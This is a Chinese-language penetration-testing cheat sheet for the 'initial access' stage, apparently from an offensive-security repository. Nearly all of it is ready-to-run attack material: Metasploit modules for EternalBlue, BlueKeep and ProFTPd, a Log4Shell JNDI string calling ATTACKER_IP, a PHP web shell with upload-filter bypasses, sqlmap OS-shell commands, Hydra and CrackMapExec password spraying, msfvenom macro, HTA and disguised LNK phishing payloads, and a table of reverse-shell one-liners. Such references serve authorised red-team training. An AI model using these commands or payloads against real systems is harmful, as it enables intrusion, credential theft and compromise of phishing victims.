# 🚪 阶段 1：初始访问（Initial Access）

<!-- language-home-navigation -->
[🏠 中文首页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](./01-Initial-Access.tr.md) • [🇬🇷 Ελληνικά](./01-Initial-Access.el.md)

```
  ██╗███╗   ██╗██╗████████╗██╗ █████╗ ██╗          █████╗  ██████╗ ██████╗███████╗███████╗███████╗
  ██║████╗  ██║██║╚══██╔══╝██║██╔══██╗██║         ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝
  ██║██╔██╗ ██║██║   ██║   ██║███████║██║         ███████║██║     ██║     █████╗  ███████╗███████╗
  ██║██║╚██╗██║██║   ██║   ██║██╔══██║██║         ██╔══██║██║     ██║     ██╔══╝  ╚════██║╚════██║
  ██║██║ ╚████║██║   ██║   ██║██║  ██║███████╗    ██║  ██║╚██████╗╚██████╗███████╗███████║███████║
  ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝   ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝
```

**目标：** 在目标网络或系统中取得初始立足点。

> **译注：** 密码喷洒通常是对多个账户尝试少量密码；使用 `-P passwords.txt` 逐一尝试密码字典的 Hydra 示例属于更一般的口令猜测，不应都理解为单密码喷洒。原文中的 `JNDI-Exploit.jar`、`proxyshell_exploit.py` 及 NSE 脚本名依赖额外工具或具体版本；这里只保留原示例，不表示环境中默认存在。`%00` 等文件名绕过也依赖旧版或特定解析行为。

---

## 🎯 攻击入口

| 攻击入口 | 说明 |
|--------|-------------|
| **利用面向公众的应用** | Web 应用、API 和 CMS 漏洞 |
| **网络钓鱼** | 携带载荷的恶意邮件 |
| **有效凭据** | 密码喷洒、撞库 |
| **外部服务** | 暴露的 RDP、SSH、VPN、FTP 服务 |
| **供应链** | 入侵受信任的软件 |

---

## 💻 利用已知漏洞

### 搜索漏洞利用代码
```bash
# SearchSploit：本地漏洞利用数据库
searchsploit apache 2.4
searchsploit -m 41234  # 将漏洞利用代码复制到当前目录
searchsploit --nmap scan.xml  # 解析 Nmap 结果

# Metasploit 搜索
msfconsole -q -x "search type:exploit apache"
```

### 常见漏洞利用

#### EternalBlue (MS17-010) - Windows SMB
```bash
# 检查是否存在漏洞
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.10

# 使用 Metasploit 利用漏洞
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set LHOST 10.10.10.10
run
```

#### Log4Shell (CVE-2021-44228)
```bash
# 测试漏洞
curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER_IP:1389/a}' http://target.com

# 设置漏洞利用服务器
java -jar JNDI-Exploit.jar -C "bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}" -A ATTACKER_IP
```

#### ProxyShell/ProxyLogon - Exchange
```bash
# 扫描 ProxyShell
nmap -p 443 --script http-vuln-exchange-proxyshell 192.168.1.10

# 使用漏洞利用代码
python3 proxyshell_exploit.py -t https://exchange.target.com -e attacker@evil.com
```

---

## 🌐 Web 应用攻击

### SQL 注入（获取 Shell）
```bash
# 测试 SQL 注入
sqlmap -u "http://target.com/page?id=1" --batch

# 通过 SQL 注入获取操作系统 Shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# 获取 SQL Shell
sqlmap -u "http://target.com/page?id=1" --sql-shell
```

### 通过文件上传获取 Shell
```bash
# 创建 PHP 反向 Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw > shell.php

# 或创建简单的 PHP Shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 绕过扩展名过滤
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
```

### 远程代码执行（RCE）
```bash
# 测试远程代码执行
curl "http://target.com/cmd.php?cmd=id"
curl "http://target.com/cmd.php?cmd=whoami"

# 通过远程代码执行建立反向 Shell
curl "http://target.com/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.10.10/4444%200>%261'"
```

---

## 🔐 凭据攻击

### 密码喷洒（Password Spraying）
```bash
# CrackMapExec - SMB
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Spring2024!' --continue-on-success

# CrackMapExec - WinRM
crackmapexec winrm 192.168.1.0/24 -u users.txt -p passwords.txt

# Hydra - SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# Hydra - RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10
```

### 撞库（Credential Stuffing）
```bash
# 使用已知泄露的凭据
hydra -C creds.txt ftp://192.168.1.10

# creds.txt 的格式：
# username:password
```

### 默认凭据
```bash
# 可尝试的常见默认凭据：
admin:admin
admin:password
root:root
root:toor
administrator:password

# 使用 CrackMapExec 测试常见凭据
crackmapexec smb 192.168.1.10 -u admin -p 'admin'
```

---

## 📧 网络钓鱼载荷（Payload）

### Office 宏载荷
```bash
# 生成宏载荷
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f vba -o macro.vba

# 或使用 msfconsole
use exploit/multi/fileformat/office_word_macro
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
run
```

### HTA 载荷
```bash
# 生成 HTA 文件
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f hta-psh -o evil.hta

# 提供文件托管服务
python3 -m http.server 80
```

### LNK 快捷方式载荷
```powershell
# 创建恶意快捷方式
$obj = New-Object -ComObject WScript.Shell
$link = $obj.CreateShortcut("C:\Users\Public\Resume.lnk")
$link.TargetPath = "cmd.exe"
$link.Arguments = "/c powershell -ep bypass -w hidden -c IEX(payload)"
$link.IconLocation = "C:\Windows\System32\notepad.exe"
$link.Save()
```

---

## 🖥️ 外部服务漏洞利用

### RDP 漏洞利用
```bash
# 暴力破解 RDP
hydra -L users.txt -P passwords.txt rdp://192.168.1.10

# BlueKeep (CVE-2019-0708)
msfconsole -q
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS 192.168.1.10
run
```

### SSH 利用
```bash
# 暴力破解 SSH
hydra -L users.txt -P passwords.txt ssh://192.168.1.10

# 使用已知凭据连接 SSH
ssh user@192.168.1.10

# 使用私钥连接 SSH
ssh -i id_rsa user@192.168.1.10
```

### FTP 漏洞利用
```bash
# 匿名登录
ftp 192.168.1.10
# 用户名：anonymous
# 密码：anonymous

# 暴力破解
hydra -L users.txt -P passwords.txt ftp://192.168.1.10

# ProFTPd 漏洞利用
msfconsole -q -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS 192.168.1.10; run"
```

---

## 🎧 设置监听器

### Netcat 监听器
```bash
nc -lvnp 4444
```

### Metasploit 处理器（Handler）
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444
run
```

### Powercat (PowerShell)
```powershell
# 在攻击机上
powercat -l -p 4444

# 在目标机上
powercat -c 10.10.10.10 -p 4444 -e cmd.exe
```

---

## 📊 快速参考

### 反向 Shell 单行命令

| 操作系统 | 命令 |
|----|---------|
| **Bash** | `bash -i >& /dev/tcp/10.10.10.10/4444 0>&1` |
| **Python** | `python -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.10.10',4444);$s=$c.GetStream();[byte[]]$b=0..65535\|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1\|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"` |
| **PHP** | `php -r '$s=fsockopen("10.10.10.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |

---

## 🔗 相关速查表

- [Metasploit](../../Metasploit/README.md)
- [SQLMap](../../SQLMap/README.md)
- [Hydra](../../Hydra/README.md)
- [Web 漏洞](../../SSRF/README.md)

---

**下一阶段：** [02 - 枚举与发现 →](./02-Enumeration.zh-CN.md)
